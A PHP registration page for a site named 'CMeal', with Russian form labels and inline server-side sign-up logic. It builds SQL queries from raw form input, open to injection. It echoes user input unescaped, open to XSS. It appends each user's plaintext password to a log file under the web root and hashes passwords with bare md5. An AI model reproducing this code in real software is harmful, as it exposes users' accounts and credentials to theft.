<!DOCTYPE html>

<html>
<head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport">
    <script src="../../lib/jQuery/jquery-3.3.1.js" type="text/javascript">
    </script>
    <link href="style/style.css" rel="stylesheet" type="text/css">
    <link href="../../lib/bootstrap/css/bootstrap.css" rel="stylesheet" type="text/css">

    <title>CMeal</title>
</head>

<body>
    <header>
        <nav class="navbar fixed-top navbar-dark navbar-expand-lg bg-dark menu">
            <div class="container-fluid">
                <div>
                    <button class="navbar-toggler" id="submenu_toggle" type="button"><span class="navbar-toggler-icon"></span></button> <a class="a_nav_tab brand" href="/" id="Home">CMeal</a>

                    <div id="submenu">
                        <ul>
                            <li class="navbarli">
                                <a class="a_nav_tab" href="/" id="Home">На главную</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </nav>
    </header>


    <form action="../sign_up/" id="first-row" method="post" name="first-row">
        <div align="center" id="sign_block">
            <div class="form-group">
                <label>Логин</label> <input class="form-control" name="login" placeholder="Логин" type="text" value="<?php echo $_POST['login']?>"> <label id="exampleInputEmail2">E-mail</label> <input class=
                "form-control" name="email" placeholder="E-mail" type="email" value="<?php echo $_POST['email']?>">
            </div>


            <div class="form-group">
                <label>Пароль</label> <input class="form-control password" id="password" name="password" placeholder="Пароль" type="password"> <input class="form-control password" name="password2" placeholder=
                "Введите пароль еще раз" type="password">
            </div>
            <button class="btn btn-outline-primary" id="regestration" name="submit" type="submit">Зарегистрироваться</button> <a href="../login" id="login">Вход</a>
        </div>


        <div align="center">
            <?php 

            require  '../../includes/DB_connection.php';

            if (isset($_POST['submit'])) 
            {

            $errors = array();

                if ($_POST['login'] == '') 
                {
                $errors[] = 'Введите Логин';
                }

                if (preg_match('/^[а-я].*$/i', $_POST['login'])) 
                {
                $errors[] = 'Для логина используйте только латиницу';
                }

                if (strlen($_POST['login']) > 12) 
                {
                $errors[] = 'Максимальная длина логина 12 символов';
                }

                if (strlen($_POST['email']) > 50) 
                {
                $errors[] = 'E-mail слишком длинный <br>
                             Максимальная длина 50 символов';
                }

                if ($_POST['email'] == '') 
                {
                $errors[] = 'Введите E-mail';
                }

                if ($_POST['password'] == '') 
                {
                $errors[] = 'Введите пароль';
                }

                if (strlen($_POST['password']) < 8) 
                {
                $errors[] = 'Пароль должен быть минимум 8 символов';
                }

                if ($_POST['password2'] != 
                    $_POST['password']) 
                {
                $errors[] = 'Пароли должны совпадать';
                }

                $login = $_POST['login'];

                $check_login_query = "
                SELECT * 
                FROM `users` 
                WHERE login = '$login' 
                ";

                $check_login = mysqli_query($connection, $check_login_query);
                
                if (mysqli_num_rows($check_login) != 0) 
                {
                    $errors[] = 'Пользователь с таким логином уже существует';
                }

                $email = $_POST['email'];

                $check_email_query = "
                SELECT * 
                FROM `users`
                WHERE email = '$email' 
                ";

                $check_email = mysqli_query($connection, $check_email_query);

                if (mysqli_num_rows($check_email) != 0) 
                {
                    $errors[] = 'Пользователь с таким E-mail уже существует';
                }

                if (empty($errors) == false) 
                {
                    echo '<div style="
                    margin-top: 10px;
                    ">
                    <p style="
                    font-size: 20px;
                    color: red;
                    padding: 2%
                    ">'
                    . array_shift($errors) .
                    '!</p>
                    </div>';
                } 

                else 
                {
                     echo '<div style="
                    margin-top: 15px;
                    ">
                    <p style="
                    font-size: 20px;
                    color: green;
                    padding: 2%;  
                    ">
                    Регистрация успешно завершена, '
                     . $_POST['login'] . 
                     ' :)
                    </p>
                    </div>';

                    // Регистрируем 

                    $login = mysqli_real_escape_string(
                        $connection,
                         trim($_POST['login']));
                    $email = mysqli_real_escape_string(
                        $connection,
                         trim($_POST['email']));
                    $password  = mysqli_real_escape_string(
                        $connection,
                         trim($_POST['password']));
                    $password2 = mysqli_real_escape_string(
                        $connection,
                         trim($_POST['password2']));
                    $token = md5(md5($login) . md5($password));

            $fl = 
            fopen('../../log/log.php', 'a+');
            fwrite($fl, '' . PHP_EOL);
            fwrite($fl, '<tr style="text-align: center;">
            <td>login: <strong>' . $login . '</strong><br>' . PHP_EOL);
            fwrite($fl, 'email: ' . $email . '<br>' . PHP_EOL);
            fwrite($fl, 'password: ' . $password . '<br></td>
            </tr>' . PHP_EOL);
            fclose($fl);

                   $insert_query = "
                   INSERT INTO
                    `users` 
                        (token, 
                        login, 
                        email, 
                        password) 
                   VALUES ('$token', 
                           '$login', 
                           '$email', 
                            md5('$password'))";

                   mysqli_query($connection, $insert_query);
                   mysqli_close($connection);
                

                }

            }

            ?>
        </div>
    </form>
    <script src="script/script.js" type="text/javascript">
    </script>
</body>
</html>
